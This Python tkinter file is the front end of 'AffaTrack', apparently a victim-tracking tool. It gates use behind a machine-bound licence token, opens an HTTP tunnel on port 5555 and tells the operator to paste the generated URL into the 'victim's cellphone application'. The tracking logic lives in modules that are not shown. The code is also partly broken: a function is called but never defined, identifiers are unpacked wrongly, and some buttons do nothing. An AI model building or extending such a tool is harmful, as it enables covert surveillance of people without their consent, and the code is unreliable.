import tkinter as tk
from tkinter import *
from tkinter import ttk
import sys
import tokenMan
from tokenMan import collec_mac_ipv4
import threading
import server


defaultTunnelSettingsFlag = True

defaultTunnelSettings = {
    'host' : "0.0.0.0",
    'port' : 5555,
    'protocol' : "http"
}


class activation_interface():
    def run_activation_interface(self):

        mac_collector = collec_mac_ipv4()  
        ipv4_collector = collec_mac_ipv4()  

        def get_identifiers(newMAc = mac_collector, newIpv4 = ipv4_collector):
            identifiers = {'Mac':newMAc, 'ipv4':newIpv4}
            return identifiers



        def compare_tokens(token):
            userToken = tokenEntry.get()

           #//validacion de token usuario y token generado

            while True:
                if userToken == token:
                    print("validado con exito")
                    activWind.destroy()
                    new_main_interface = mainInterface()
                    new_main_interface.run_main_interface()
   

                    break
                else:

                    activWind.destroy()
                    print("token no valido")
                    break
 
            print(userToken)

        def closeProgram():
            sys.exit()

        identifiers = get_identifiers()

        newGenToken = tokenMan.Token(*identifiers)
        token = newGenToken.generate_token()

        activWind = tk.Tk()
        activWind.title("AffaTrack Activation Window")
        activWind.geometry("800x500")
        activWind.configure(bg="black")
        title = tk.Label(activWind, 
            text="AffaTrack",
            bg="black", 
            fg="red", 
            font=("Helvetica",40,"bold"), 
            anchor="center"
            ).pack(side="top", fill="both", anchor="n",pady=10)

        instructionsLabel1 = tk.Label(activWind,
            text="Enter the provided activation Token to start",
            bg = "black",
            fg = "white",
            font=20,
            anchor="center",
  
        ).pack(fill="both",anchor="n", pady=20,)

        tokenEntry = Entry(activWind, width=40)
        tokenEntry.pack(anchor="n", pady= 20)

        activateButton = Button(activWind, 
            text="Activate", 
            width=20 , 
            bg="#999595", fg="black" 
            ,command=lambda: compare_tokens(token)
            ).pack(pady=50)


        exitButton = Button(activWind, text="Exit", width=20 , bg="#999595", fg="black" ,command=closeProgram).pack(pady=20)

        activWind.mainloop()





class mainInterface():
    def run_main_interface(self):

        def start_server_wind():
            mainWind.withdraw()
            newServerWind = tunnel_creator_interface()
            newServerWind.run_tunnel_creator_interface()


        mainWind = tk.Tk()
        mainWind.title("AffaTrack main")
        mainWind.geometry("800x500")
        mainWind.configure(bg="black")
        title = tk.Label(mainWind, 
            text="AffaTrack",
            bg="black", 
            fg="red", 
            font=("Helvetica",40,"bold"), 
            anchor="center"
            ).pack(side="top", fill="both", anchor="n",pady=10)

        
        serverButton = Button(mainWind, 
            text="Generate URL", 
            width=20 , 
            bg="#999595", fg="black",
            command=start_server_wind
            ).pack(pady=30)
        

                
        settingsButton = Button(mainWind, 
            text="Server Settings", 
            width=20 , 
            bg="#999595", fg="black",
            ).pack(pady=30)


        helpButton = Button(mainWind, 
            text="Help", 
            width=20 , 
            bg="#999595", fg="black",
            ).pack(pady=30)

        exitButton = Button(mainWind, 
            text="Exit", 
            width=20 , 
            bg="#999595", fg="black",
            ).pack(pady=30)
        


        mainWind.mainloop()



class tunnel_creator_interface():
    def run_tunnel_creator_interface(self):


        def stopTunnelUrl(new_url,http_tunel, show_generated_url, stopTunnelButton, startServerButton ):
            new_url.stop_http_tunnel(http_tunel) #objeto new_url llama al metodo stop_http_tunnel para cerra el tunel
            
            generating_url_message.config(text="The tunnel has been closed")
            show_generated_url.destroy()
            stopTunnelButton.config(
                text="Menu"
            )
            startServerButton.destroy()


        def generate_url(host,port,protocol):



            new_url = server.http_tunnel(host,port,protocol)
            url, http_tunel = new_url.start_http_tunnel()
            progress_bar.stop()
            progress_bar.destroy()
            generating_url_message.config(text="Copy and paste this URL into your victim's cellphone application.")
            show_generated_url = Label(tunnelWind, text=url, fg="white",bg="black", font=15)
            show_generated_url.pack(pady=20)

            startServerButton = Button(tunnelWind, 
                text="Start Server", 
                width=20,
                bg="#999595", 
                fg="black",
                command= start_server_interface
            )
            startServerButton.pack(pady=15)

            stopTunnelButton = Button(tunnelWind, 
                text="Stop Tunnel", 
                width=20,
                bg="#999595", 
                fg="black",
                command= lambda: stopTunnelUrl(new_url,http_tunel,show_generated_url, stopTunnelButton, startServerButton)
            )
            stopTunnelButton.pack(pady=15)



        def start_server_interface():

            newServerWind = server_listening_interface()
            newServerWind.run_server_interface()


        def start_generating_thread_url(host,port,protocol):

            
            url_thread = threading.Thread(target= lambda:generate_url(host,port,protocol))
            url_thread.start()



        tunnelWind = tk.Tk()    

        tunnelWind.title("AffaTrack main")
        tunnelWind.geometry("800x500")
        tunnelWind.configure(bg="black")
        title = tk.Label(tunnelWind, 
            text="AffaTrack",
            bg="black", 
            fg="red", 
            font=("Helvetica",40,"bold"), 
            anchor="center"
            ).pack(side="top", fill="both", anchor="n",pady=10)
        
        
        generating_url_message = tk.Label(tunnelWind,
            text="Generando url...",
            bg = "black",
            fg = "white",
            font=15,
            anchor="center",
  
        )
        generating_url_message.pack(fill="both",anchor="n", pady=20,)

        progress_bar = ttk.Progressbar(tunnelWind, orient="horizontal", length=500, mode="indeterminate")
        progress_bar.pack(pady=20)
        progress_bar.start()

        if defaultTunnelSettingsFlag == True:
            start_generating_thread_url(**defaultTunnelSettings)
        else:
            start_generating_url()

        


        tunnelWind.mainloop()

class server_listening_interface():
    def run_server_interface(self):

        serverWind = tk.Tk() 

        serverWind.title("AffaTrack HTTP server listening..")
        serverWind.geometry("800x500")
        serverWind.configure(bg="black")
        title = tk.Label(serverWind, 
            text="AffaTrack",
            bg="black", 
            fg="red", 
            font=("Helvetica",40,"bold"), 
            anchor="center"
            ).pack(side="top", fill="both", anchor="n",pady=10)







        serverWind.mainloop()


window = mainInterface()
window.run_main_interface()